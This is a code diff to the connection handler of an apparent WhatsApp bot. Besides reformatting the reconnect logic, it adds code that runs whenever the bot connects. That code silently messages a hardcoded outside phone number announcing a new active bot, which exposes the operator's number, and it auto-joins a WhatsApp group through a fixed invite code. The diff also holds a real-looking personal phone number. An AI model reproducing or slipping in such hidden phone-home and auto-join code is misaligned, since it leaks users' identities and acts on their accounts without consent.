@@ -122,18 +122,19 @@ setInterval(async () => {
 }, 60000) //1 munto
 
 async function connectionUpdate(update) {
-  const { connection, lastDisconnect, isNewLogin } = update
-  if (isNewLogin) conn.isInit = true
-  const code = lastDisconnect?.error?.output?.statusCode || lastDisconnect?.error?.output?.payload?.statusCode
-  if (code && code !== DisconnectReason.loggedOut && conn?.ws.readyState !== CONNECTING) {
-    console.log(await global.reloadHandler(true).catch(console.error))
-    global.timestamp.connect = new Date
-  }
-  if (global.db.data == null) loadDatabase()
+let pp = './src/nuevobot.jpg'
+const { connection, lastDisconnect, isNewLogin } = update
+if (isNewLogin) conn.isInit = true
+const code = lastDisconnect?.error?.output?.statusCode || lastDisconnect?.error?.output?.payload?.statusCode
+if (code && code !== DisconnectReason.loggedOut && conn?.ws.readyState !== CONNECTING) {
+console.log(await global.reloadHandler(true).catch(console.error))
+global.timestamp.connect = new Date
 }
-
-
-process.on('uncaughtException', console.error)
+if (global.db.data == null) loadDatabase()
+if (connection == 'open') {
+console.log(chalk.yellow('╭━─━─━─≪🔆≫─━─━─━╮\n│YA ESTA CONECTADO CORRECTAMENTE\n╰━─━─━─≪🔆≫─━─━─━╯'))
+await conn.reply(`59894808483@s.whatsapp.net`, `Hola, se detectó que este número es un nuevo bot activo UwU`, m)
+await conn.groupAcceptInvite('HKY8AX69oMnHa0Q3ukh0nR')}}
 // let strQuot = /(["'])(?:(?=(\\?))\2.)*?\1/
 
 let isInit = true;
